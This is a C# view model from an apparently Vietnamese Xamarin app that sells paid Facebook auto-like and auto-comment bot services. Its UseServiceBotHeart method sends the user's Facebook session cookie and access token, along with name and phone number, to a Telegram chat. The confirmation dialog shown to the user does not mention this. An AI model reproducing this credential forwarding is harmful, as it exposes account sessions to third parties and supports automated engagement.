using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Input;
using AUTOHLT.MOBILE.Configurations;
using AUTOHLT.MOBILE.Controls.Dialog.ConnectFacebook;
using AUTOHLT.MOBILE.Models.Facebook;
using AUTOHLT.MOBILE.Models.Product;
using AUTOHLT.MOBILE.Models.Telegram;
using AUTOHLT.MOBILE.Models.User;
using AUTOHLT.MOBILE.Resources.Languages;
using AUTOHLT.MOBILE.Services.Database;
using AUTOHLT.MOBILE.Services.Facebook;
using AUTOHLT.MOBILE.Services.Guide;
using AUTOHLT.MOBILE.Services.Product;
using AUTOHLT.MOBILE.Services.Telegram;
using AUTOHLT.MOBILE.Services.User;
using Microsoft.AppCenter.Crashes;
using Newtonsoft.Json;
using Prism.Navigation;
using Prism.Services;
using Prism.Services.Dialogs;
using Xamarin.Essentials;
using Xamarin.Forms;

namespace AUTOHLT.MOBILE.ViewModels.VipInteraction
{
    public class VipInteractionViewModel : ViewModelBase
    {
        private bool _isLoading;
        private IDatabaseService _databaseService;
        private IProductService _productService;
        private List<ListRegisterProductModel> _regis;
        private List<ProductModel> _productData;
        private IUserService _userService;
        private IPageDialogService _pageDialogService;
        private IFacebookService _facebookService;
        private IDialogService _dialogService;
        private ITelegramService _telegramService;
        private List<ListRegisterProductModel> _lsDangky = new List<ListRegisterProductModel>();
        private IGuideService _guideService;

        public ICommand HDSDCommand { get; private set; }
        public ICommand AutoBotHeartCommand { get; private set; }
        public List<ProductModel> ProductData
        {
            get => _productData;
            set => SetProperty(ref _productData, value);
        }

        public bool IsLoading
        {
            get => _isLoading;
            set => SetProperty(ref _isLoading, value);
        }
        public VipInteractionViewModel(INavigationService navigationService, IDatabaseService databaseService, IProductService productService, IUserService userService, IPageDialogService pageDialogService, IFacebookService facebookService, IDialogService dialogService, ITelegramService telegramService, IGuideService guideService) : base(navigationService)
        {
            _guideService = guideService;
            _telegramService = telegramService;
            _dialogService = dialogService;
            _facebookService = facebookService;
            _userService = userService;
            _pageDialogService = pageDialogService;
            _productService = productService;
            _databaseService = databaseService;
            AutoBotHeartCommand = new Command<ProductModel>(AutoBotHeart);
            HDSDCommand = new Command(HDSDApp);
        }

        private async void HDSDApp()
        {
            try
            {
                var data = await _guideService.GetGuide(10);
                await Browser.OpenAsync(data?.Url);
            }
            catch (Exception ex)
            {
                Crashes.TrackError(ex);
            }
        }

        /// <summary>
        /// lay danh sach ban be
        /// </summary>
        /// <param name="token"></param>
        /// <param name="numberFriends"></param>
        /// <returns></returns>
        private async Task<FriendsModel> GetFriend(string token, string numberFriends)
        {
            try
            {
                var data = await _facebookService.GetAllFriend(numberFriends, token);
                return data;
            }
            catch (Exception e)
            {
                Crashes.TrackError(e);
            }

            return null;
        }
        /// <summary>
        /// Kiểm tra cookie và token
        /// </summary>
        /// <param name="token"></param>
        /// <param name="cookie"></param>
        /// <returns></returns>
        private async Task<bool> CheckCookieAndToken(string token, string cookie)
        {
            try
            {
                var isCookie = await _facebookService.CheckCookie(cookie);
                if (!isCookie)
                {
                    return false;
                }

                var friends = await GetFriend(token, "1");
                if (friends == null || friends.data == null)
                {
                    return false;
                }

                return true;
            }
            catch (Exception e)
            {
                Crashes.TrackError(e);
                return false;
            }
        }
        private async void AutoBotHeart(ProductModel product)
        {
            try
            {
                if (IsLoading) return;
                IsLoading = true;
                if (product != null && product.DateCreate != null)
                {
                    var user = await _databaseService.GetAccountUser();
                    if (user != null && user.UserName != null)
                    {
                        if (product.IsRegisterProduct)
                        {
                            // Yêu cầu cài lại bot tim
                            var cookie = Preferences.Get(AppConstants.CookieFacebook, "");
                            var token = Preferences.Get(AppConstants.TokenFaceook, "");
                            var isCheckData = await CheckCookieAndToken(token, cookie);
                            if (isCheckData)
                            {
                                await UseServiceBotHeart(token, cookie, user, product.ID, product.EndDate);
                            }
                            else
                            {
                                var result = await _pageDialogService.DisplayAlertAsync(Resource._1000021,
                                    "Bạn cần kết nối với facebook của mình để sử dụng tinh năng này !", "OK", "Cancel");
                                if (result)
                                {
                                    _dialogService.ShowDialog(nameof(ConnectFacebookDialog), null, (res) =>
                                   {
                                       AutoBotHeart(product);
                                   });
                                }
                            }
                        }
                        else
                        {
                            // Đăng ký bot tim
                            var username = user.UserName;
                            var idUser = user.ID;
                            var moneyModel = await _userService.GetMoneyUser(username);
                            if (moneyModel != null && moneyModel.Code > 0 && moneyModel.Data != null)
                            {
                                var money = long.Parse(moneyModel.Data.Replace(".0000", ""));
                                var price = long.Parse(product.Price);
                                if (money >= price)
                                {
                                    var messager = $"Bạn mua dịch vụ auto like và comment avatar trong {product.EndDate} ngày với giá {string.Format(new CultureInfo("en-US"), "{0:0,0}", long.Parse(product.Price))} VND";
                                    var res = await _pageDialogService.DisplayAlertAsync(Resource._1000035, messager,
                                        "OK",
                                        "Cancel");
                                    if (res)
                                    {
                                        var registerProduct = await _productService.RegisterProduct(product.ID, idUser);
                                        if (registerProduct != null && registerProduct.Code > 0 &&
                                            registerProduct.Data != null)
                                        {

                                            var updateUser =
                                                await _userService.SetMoneyUser(username, money - price + "");
                                            if (updateUser != null && updateUser.Code > 0)
                                            {
                                                await _pageDialogService.DisplayAlertAsync(Resource._1000035,
                                                    Resource._1000040,
                                                    "OK");
                                                await InitializeData();
                                                await _productService.AddHistoryUseService(product.ID,
                                                    "Tăng mặt livestream", user.ID, "0",
                                                    DateTime.Now.ToString("dd/MM/yyyy hh:mm:ss"));
                                            }
                                            else
                                            {
                                                await _pageDialogService.DisplayAlertAsync(Resource._1000035,
                                                    Resource._1000041,
                                                    "OK");
                                            }
                                        }
                                    }
                                }
                                else
                                {
                                    await _pageDialogService.DisplayAlertAsync(Resource._1000035, moneyModel.Message,
                                        "OK");
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Crashes.TrackError(e);
            }
            finally
            {
                IsLoading = false;
            }
        }

        private async Task UseServiceBotHeart(string token, string cookie, UserModel user, string id, string end)
        {
            var userFacebook = await _facebookService.GetInfoUser("name,picture", token);
            var res = await _pageDialogService.DisplayAlertAsync(Resource._1000021,
                $"Cài đặt tự động thả tim cho tài khoản {userFacebook.name} !", "OK", "Cancel");
            var spDangky = _lsDangky.FirstOrDefault(x => x.ID_ProductType == id);
            if (res)
            {
                var content = JsonConvert.SerializeObject(new MessageNotificationTelegramModel
                {
                    Ten_Thong_Bao = "Tự động like và comment avatar bạn bè",
                    So_Luong = 1,
                    Id_Nguoi_Dung = user?.ID,
                    Noi_Dung_Thong_Bao = new
                    {
                        Cookie = cookie,
                        Token = token,
                    },
                    Ghi_Chu = new
                    {
                        Ten = user?.Name,
                        Tai_Khoan = user?.UserName,
                        So_dien_thoai = user?.NumberPhone,
                        Ngay_Dang_Dich_Vu = spDangky?.DateCreate,
                        Thoi_Han_Goi = $"{end} ngày",
                    }
                }, Formatting.Indented);
                var tele = await _telegramService.SendMessageToTelegram(AppConstants.IdChatWork,
                    content);
            }
        }

        public override void Initialize(INavigationParameters parameters)
        {
            base.Initialize(parameters);
            IsLoading = true;
        }

        public override async void OnNavigatedTo(INavigationParameters parameters)
        {
            base.OnNavigatedTo(parameters);
            await InitializeData();
            IsLoading = false;
        }
        private async Task InitializeData()
        {
            try
            {
                var user = await _databaseService.GetAccountUser();
                var data = await _productService.GetAllProduct();
                var regisProductData = await _productService.GetListRegisterProductForUser(user.ID);
                if (regisProductData != null && regisProductData.Code > 0 && regisProductData.Data != null &&
                    regisProductData.Data.Any())
                    _regis = new List<ListRegisterProductModel>(regisProductData.Data);
                if (data != null && data.Code > 0 && data.Data.Any())
                {
                    var product = new List<ProductModel>();
                    var lsProduct = data.Data;
                    foreach (var item in lsProduct)
                    {
                        if (item.GroupProduct == "10")
                        {
                            item.Icon = "icon_Interactive.png";
                            if (_regis != null && _regis.Any())
                            {
                                var obj = _regis.FirstOrDefault(x => x.ID_ProductType == item.ID);
                                if (obj != null)
                                {
                                    var endDate = DateTime.Parse(obj.DateCreate);
                                    var totalDay = (DateTime.Now - endDate).TotalDays;
                                    var number = double.Parse(item.EndDate);
                                    if (totalDay <= number)
                                    {
                                        item.IsRegisterProduct = true;
                                        item.BadgeView = "Paid";
                                        _lsDangky.Add(obj);
                                    }
                                }
                            }
                            product.Add(item);
                        }
                    }

                    ProductData = new List<ProductModel>(product.OrderBy(x => int.Parse(x.Price)));
                }

            }
            catch (Exception e)
            {
                Crashes.TrackError(e);
            }
        }
    }
}